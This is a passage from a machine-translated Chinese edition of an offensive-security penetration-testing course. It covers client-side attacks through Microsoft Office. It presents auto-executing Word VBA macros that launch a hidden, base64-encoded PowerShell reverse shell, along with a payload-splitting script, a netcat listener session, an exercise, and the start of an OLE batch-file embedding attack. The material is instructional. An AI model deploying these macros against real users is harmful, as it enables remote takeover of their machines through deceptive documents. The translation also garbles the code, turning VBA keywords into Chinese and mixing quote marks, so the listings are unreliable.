<div style="position:absolute;top:129815;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CreateObject </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">354</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数以及</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wscript.Shell Run</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法。</font><font style="vertical-align: inherit;">该宏的代码是</font></font></nobr></div>
<div style="position:absolute;top:129834;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如下图：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:129869;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子我的宏()</font></font></nobr></div>
<div style="position:absolute;top:129903;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CreateObject("Wscript.Shell").运行"cmd"</font></font></nobr></div>
<div style="position:absolute;top:129937;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结束子</font></font></nobr></div>
<div style="position:absolute;top:129957;left:353"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 393 - 宏打开 cmd.exe</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:129986;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于 Office 宏不会自动执行，我们必须利用两个预定义的</font></font></nobr></div>
<div style="position:absolute;top:130005;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">程序，即</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AutoOpen</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">程序，在打开新文档时执行</font></font></nobr></div>
<div style="position:absolute;top:130024;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Document_Open </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">355</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">过程，当重新打开一个已经打开的文档时执行该过程</font></font></nobr></div>
<div style="position:absolute;top:130044;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开。</font><font style="vertical-align: inherit;">这两个过程都可以调用我们的自定义过程并因此运行我们的代码。</font></font></nobr></div>
<div style="position:absolute;top:130077;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们更新的 VBA 代码在下面的清单 394 中。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:130112;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子自动打开()</font></font></nobr></div>
<div style="position:absolute;top:130145;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我的宏</font></font></nobr></div>
<div style="position:absolute;top:130180;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结束子</font></font></nobr></div>
<div style="position:absolute;top:130213;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子 Document_Open()</font></font></nobr></div>
<div style="position:absolute;top:130247;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我的宏</font></font></nobr></div>
<div style="position:absolute;top:130282;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结束子</font></font></nobr></div>
<div style="position:absolute;top:130315;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子我的宏()</font></font></nobr></div>
<div style="position:absolute;top:130349;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CreateObject("Wscript.Shell").运行"cmd"</font></font></nobr></div>
<div style="position:absolute;top:130383;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结束子</font></font></nobr></div>
<div style="position:absolute;top:130403;left:319"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 394 - 宏自动执行 cmd</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:130432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们必须将包含文档保存为 .docm 或旧的 .doc 格式，它支持</font></font></nobr></div>
<div style="position:absolute;top:130451;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">嵌入宏，但必须避免不支持它们的 .docx 格式。</font></font></nobr></div>
<div style="position:absolute;top:130484;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们重新打开包含我们的宏的文档时，我们将看到一个安全警告</font></font></nobr></div>
<div style="position:absolute;top:130504;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（图 250），表示已禁用宏。</font><font style="vertical-align: inherit;">我们必须单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启用内容</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来运行</font></font></nobr></div>
<div style="position:absolute;top:130523;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">宏。</font><font style="vertical-align: inherit;">这是 Microsoft Office 的默认安全设置，虽然可以完全</font></font></nobr></div>
<div style="position:absolute;top:130542;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">禁止使用宏来防范这种攻击，它们通常被启用，因为它们很常见</font></font></nobr></div>
<div style="position:absolute;top:130562;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在大多数环境中使用。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:130707;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">354 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://docs.microsoft.com/en-us/office/vba/Language/Reference/User-Interface-Help/createobject-function</font></font></font></nobr></div>
<div style="position:absolute;top:130727;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">355 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://docs.microsoft.com/en-us/office/vba/api/Word.Documents.Open</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:130855;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="111"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 111 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:130888;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:131965;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:131965;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:131965;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">431</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:131193;left:311"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 250：Microsoft Word 宏安全警告</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:131225;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们按下“</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启用内容”</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">按钮，宏将执行并打开命令提示符。</font></font></nobr></div>
<div style="position:absolute;top:131257;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在现实世界中，如果受害者不点击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Enable Content</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，则攻击将失败。</font><font style="vertical-align: inherit;">为了克服这一点，</font></font></nobr></div>
<div style="position:absolute;top:131277;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">受害者必须没有意识到潜在的后果或受到了充分的鼓励</font></font></nobr></div>
<div style="position:absolute;top:131296;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">演示文稿单击此按钮。</font></font></nobr></div>
<div style="position:absolute;top:131329;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与最初的 HTML 应用程序一样，命令执行是一个开始，但反向 shell 将是</font></font></nobr></div>
<div style="position:absolute;top:131348;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">好多了。</font><font style="vertical-align: inherit;">为此，我们将再次转向 PowerShell 并重用执行的能力</font></font></nobr></div>
<div style="position:absolute;top:131368;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Base64 编码字符串的 Metasploit shellcode。</font></font></nobr></div>
<div style="position:absolute;top:131400;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了实现这一点，我们将声明一个</font><i><font style="vertical-align: inherit;">String</font></i><font style="vertical-align: inherit;">类型</font><font style="vertical-align: inherit;">的变量（</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Dim </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">356</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">），</font><font style="vertical-align: inherit;">其中包含 PowerShell</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:131420;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们希望执行的命令。</font><font style="vertical-align: inherit;">我们将添加一行来为我们的字符串变量保留空间</font></font></nobr></div>
<div style="position:absolute;top:131439;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">宏：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:131474;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子自动打开()</font></font></nobr></div>
<div style="position:absolute;top:131491;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我的宏</font></font></nobr></div>
<div style="position:absolute;top:131508;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结束子</font></font></nobr></div>
<div style="position:absolute;top:131542;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子 Document_Open()</font></font></nobr></div>
<div style="position:absolute;top:131559;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我的宏</font></font></nobr></div>
<div style="position:absolute;top:131576;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结束子</font></font></nobr></div>
<div style="position:absolute;top:131610;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子我的宏()</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:131627;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Dim Str As String</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:131661;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CreateObject("Wscript.Shell").Run Str</font></font></nobr></div>
<div style="position:absolute;top:131678;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结束子</font></font></nobr></div>
<div style="position:absolute;top:131697;left:332"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 395 - 创建我们的第一个字符串变量</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:131726;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以将 base64 编码的 PowerShell 脚本嵌入为单个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">String</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，但 VBA 有一个 255-</font></font></nobr></div>
<div style="position:absolute;top:131746;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文字字符串的字符限制。</font><font style="vertical-align: inherit;">此限制不适用于存储在变量中的字符串，因此我们</font></font></nobr></div>
<div style="position:absolute;top:131765;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以将命令拆分为多行并将它们连接起来。</font></font></nobr></div>
<div style="position:absolute;top:131798;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用一个简单的 Python 脚本来拆分我们的命令：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:131833;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC ....."</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:131915;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">356 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/dotnet/visual-basic/language-reference/statements/dim-statement</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:132043;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="112"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 112 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:132076;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:133153;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:133153;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:133153;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">432</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:132172;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">n = 50</font></font></nobr></div>
<div style="position:absolute;top:132205;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于范围内的 i (0, len(str), n)：</font></font></nobr></div>
<div style="position:absolute;top:132222;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印 "Str = Str + " + '"' + str[i:i+n] + '"'</font></font></nobr></div>
<div style="position:absolute;top:132242;left:295"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 396 - 拆分 Base64 编码字符串的 Python 脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:132271;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将 Base64 编码的字符串拆分成更小的块后，我们可以更新我们的漏洞利用，如图所示</font></font></nobr></div>
<div style="position:absolute;top:132291;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在清单 397 中。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:132325;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子自动打开()</font></font></nobr></div>
<div style="position:absolute;top:132343;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我的宏</font></font></nobr></div>
<div style="position:absolute;top:132359;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结束子</font></font></nobr></div>
<div style="position:absolute;top:132393;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子 Document_Open()</font></font></nobr></div>
<div style="position:absolute;top:132410;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我的宏</font></font></nobr></div>
<div style="position:absolute;top:132427;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结束子</font></font></nobr></div>
<div style="position:absolute;top:132461;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子我的宏()</font></font></nobr></div>
<div style="position:absolute;top:132478;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Dim Str As String</font></font></nobr></div>
<div style="position:absolute;top:132512;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"</font></font></nobr></div>
<div style="position:absolute;top:132529;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"</font></font></nobr></div>
<div style="position:absolute;top:132546;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Str = Str +“TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A”</font></font></nobr></div>
<div style="position:absolute;top:132563;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Str = Str + "EYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAEg"</font></font></nobr></div>
<div style="position:absolute;top:132580;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Str = Str + "ANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEATAAxAFgANgAyACsAY"</font></font></nobr></div>
<div style="position:absolute;top:132597;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Str = Str + "gBTAEIARAAvAG4ARQBqADUASAAvAGgAZwBDAFoAQwBJAFoAUgB"</font></font></nobr></div>
<div style="position:absolute;top:132614;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:132631;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Str = Str + "AZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0Ac"</font></font></nobr></div>
<div style="position:absolute;top:132648;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Str = Str + "AByAGUAcwBzACkADQAKACQAcwB0AHIAZQBhAG0AIAA9ACAATgB"</font></font></nobr></div>
<div style="position:absolute;top:132665;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Str = Str + "lAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdABYAGUAYQBtA"</font></font></nobr></div>
<div style="position:absolute;top:132682;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Str = Str + "FIAZQBhAGQAZQByACgAJABnAHoAaQBwACkADQAKAGkAZQB4ACA"</font></font></nobr></div>
<div style="position:absolute;top:132699;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Str = Str + "AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK"</font></font></nobr></div>
<div style="position:absolute;top:132716;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Str = Str + "QA="</font></font></nobr></div>
<div style="position:absolute;top:132750;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CreateObject("Wscript.Shell").Run Str</font></font></nobr></div>
<div style="position:absolute;top:132767;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结束子</font></font></nobr></div>
<div style="position:absolute;top:132786;left:274"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 397 - 宏调用 PowerShell 来创建反向 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:132815;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保存 Word 文档，关闭它，然后重新打开它会自动执行宏。</font><font style="vertical-align: inherit;">注意</font></font></nobr></div>
<div style="position:absolute;top:132835;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">宏安全警告只有在更改文档名称时才会重新出现。</font><font style="vertical-align: inherit;">要是我们</font></font></nobr></div>
<div style="position:absolute;top:132854;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在打开更新的文档之前启动了一个 Netcat 监听器，我们会看到宏</font></font></nobr></div>
<div style="position:absolute;top:132873;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完美运行：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:132908;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -lnvp 4444</font></font></font></b></nobr></div>
<div style="position:absolute;top:132925;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 4444 ...</font></font></nobr></div>
<div style="position:absolute;top:132942;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从（未知）[10.11.0.22] 59111 连接到 [10.11.0.4]</font></font></nobr></div>
<div style="position:absolute;top:132959;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows [版本 10.0.17134.590]</font></font></nobr></div>
<div style="position:absolute;top:132976;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(c) 2018 年微软公司。</font><font style="vertical-align: inherit;">版权所有。</font></font></nobr></div>
<div style="position:absolute;top:133010;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\Offsec&gt;</font></font></nobr></div>
<div style="position:absolute;top:133029;left:332"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 398 - Word 宏的反向 shell </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:133231;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="113"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 113 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:133264;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:134341;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:134341;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:134341;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">433</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:133360;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.3.2.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:133390;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用来自 HTA 攻击的 PowerShell 负载创建一个 Word 宏，该宏发送一个</font></font></nobr></div>
<div style="position:absolute;top:133409;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将 shell 反向到您的 Kali 系统。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:133444;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.3.3</font></font></i></nobr></div>
<div style="position:absolute;top:133444;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象链接和嵌入</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:133481;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另一种针对 Microsoft Office 的流行客户端攻击滥用动态数据交换</font></font></nobr></div>
<div style="position:absolute;top:133501;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DDE</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">357</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 Office 文档中执行任意应用程序，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">358</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但这已经</font></font></nobr></div>
<div style="position:absolute;top:133520;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自 2017 年 12 月起修补</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。359</font></font></font></nobr></div>
<div style="position:absolute;top:133553;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，我们仍然可以利用对象链接和嵌入 ( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OLE</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">360</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来滥用 Microsoft Office 的</font></font></nobr></div>
<div style="position:absolute;top:133573;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文档嵌入功能。</font></font></nobr></div>
<div style="position:absolute;top:133605;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种攻击场景中，我们将</font><font style="vertical-align: inherit;">在 Microsoft Word 中</font><font style="vertical-align: inherit;">嵌入一​​个 Windows 批处理文件</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">361</font></font></font><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:133625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文档。</font></font></nobr></div>
<div style="position:absolute;top:133658;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 批处理文件是一种较旧的格式，通常被更现代的 Windows 本机脚本取代</font></font></nobr></div>
<div style="position:absolute;top:133677;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VBScript 和 PowerShell 等语言。</font><font style="vertical-align: inherit;">但是，批处理脚本仍然可以正常运行</font></font></nobr></div>
<div style="position:absolute;top:133696;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Windows 10 上并允许执行应用程序。</font><font style="vertical-align: inherit;">下面的清单显示了一个初始</font></font></nobr></div>
<div style="position:absolute;top:133715;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动 cmd.exe 的概念验证批处理脚本 (launch.bat)：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:133750;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动cmd.exe</font></font></nobr></div>
<div style="position:absolute;top:133770;left:319"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 399 - 启动 cmd.exe 的简单批处理文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:133799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将在 Microsoft Word 文档中包含上述脚本。</font><font style="vertical-align: inherit;">我们将打开 Microsoft Word，</font></font></nobr></div>
<div style="position:absolute;top:133818;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建一个新文档，导航到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">插入</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">功能区，然后单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">菜单。</font><font style="vertical-align: inherit;">在这里，我们将</font></font></nobr></div>
